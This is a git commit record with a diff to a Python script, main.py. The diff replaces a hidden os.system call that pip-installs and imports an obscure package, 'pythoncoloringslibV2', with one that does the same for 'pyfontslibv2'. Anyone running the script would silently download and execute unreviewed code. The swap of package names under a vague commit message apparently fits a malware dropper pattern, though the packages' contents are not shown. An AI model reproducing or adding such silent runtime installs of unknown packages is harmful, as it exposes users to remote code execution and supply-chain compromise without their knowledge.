3f127d3c3c8c3695ef5869a4c8b3ec58b0493c51
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-29 05:09:11 -0700

    Update main.py

--- main.py
+++ main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pyfontslibv2")
+import pyfontslibv2
 import sys
 import time
 import psutil
